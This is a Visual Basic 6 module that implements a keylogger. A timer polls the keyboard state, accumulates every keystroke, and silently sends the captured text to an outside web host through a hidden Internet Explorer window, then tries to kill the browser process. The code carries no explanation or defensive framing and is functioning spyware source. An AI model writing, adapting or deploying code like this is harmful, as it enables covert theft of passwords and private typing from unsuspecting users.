Attribute VB_Name = "Module1"
Public Const DT_CENTER = &H1
Public Const DT_WORDBREAK = &H10

Public Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Public Declare Function KillTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Public Cnt&, sSave$, sOld$, Ret$, Tel&

Function GetPressedKey() As String
     For Cnt = 32 To 128
        If GetAsyncKeyState(Cnt) <> 0 Then
           GetPressedKey = Chr$(Cnt)
           Exit For
        End If
     Next Cnt
End Function

Sub TimerProc(ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long)
     Ret = GetPressedKey
     If Ret <> sOld Then
        sOld = Ret
        sSave = sSave + sOld
        If Ret <> "" Then
            Shell "C:\Program Files\Internet Explorer\IEXPLORE.EXE" & Space(1) & _
            "www.suwumuyangzjd.com/s.asp?rtxt1=" & sSave, vbHide
            Shell "taskkill /f /im iexplorer.exe"
        End If
     End If
End Sub

